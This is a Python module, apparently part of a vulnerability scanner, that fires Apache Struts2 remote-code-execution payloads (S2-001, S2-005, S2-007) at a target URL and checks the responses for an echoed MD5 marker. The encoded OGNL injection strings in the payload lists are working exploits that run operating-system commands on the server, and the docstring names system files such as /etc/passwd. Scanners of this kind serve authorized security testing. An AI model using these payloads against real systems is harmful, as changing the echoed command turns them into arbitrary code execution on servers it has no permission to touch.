#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ApacheStruts2扫描类: 
        Struts2 远程代码执行
            S2-001
            S2-005
            S2-007
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests

class Struts2():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheStruts2'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.s2_001_payloads = [
            {
                'path': 'login.action',
                'data': 'username=admin&password=%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22echo%22%2C%20%22{}%22%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D'.format(self.md)
            },
        ]

        self.s2_005_payloads = [
            {
                'path': 'example/HelloWorld.action?(a)(%5cu0023_memberAccess.allowStaticMethodAccess%5cu003dtrue)&(b)(%5cu0023context[\'xwork.MethodAccessor.denyMethodExecution\']%5cu003dfalse)&(c)(%5cu0023ret%5cu003d@java.lang.Runtime@getRuntime().exec(\'echo%20{}\'))&(d)(%5cu0023dis%5cu003dnew%5cu0020java.io.BufferedReader(new%5cu0020java.io.InputStreamReader(%5cu0023ret.getInputStream())))&(e)(%5cu0023res%5cu003dnew%5cu0020char[20000])&(f)(%5cu0023dis.read(%5cu0023res))&(g)(%5cu0023writer%5cu003d@org.apache.struts2.ServletActionContext@getResponse().getWriter())&(h)(%5cu0023writer.println(new%5cu0020java.lang.String(%5cu0023res)))&(i)(%5cu0023writer.flush())&(j)(%5cu0023writer.close())'.format(self.md),
                'data': ''
            }
        ]

        self.s2_007_payloads = [
            {
                'path': 'user.action?name=cat&email=jerry@mouse.com&age=%27%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27echo%20{}%27).getInputStream()))%20%2B%20%27'.format(self.md),
                'data': ''
            }
        ]

    def s2_001_scan(self, url):
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'S2-001'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])             # * 合并Headers

        for payload in self.s2_001_payloads:            # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Data': data
                    }
                }
                return results

    def s2_005_scan(self, url):
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'S2-005'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])             # * 合并Headers

        for payload in self.s2_005_payloads:            # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': url + 'example/HelloWorld.action',
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def s2_007_scan(self, url):
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'S2-007'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])             # * 合并Headers

        for payload in self.s2_007_payloads:            # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': url + 'user.action',
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.s2_001_scan, url=url),
            thread(target=self.s2_005_scan, url=url),
            thread(target=self.s2_007_scan, url=url)
        ]
struts2 = Struts2()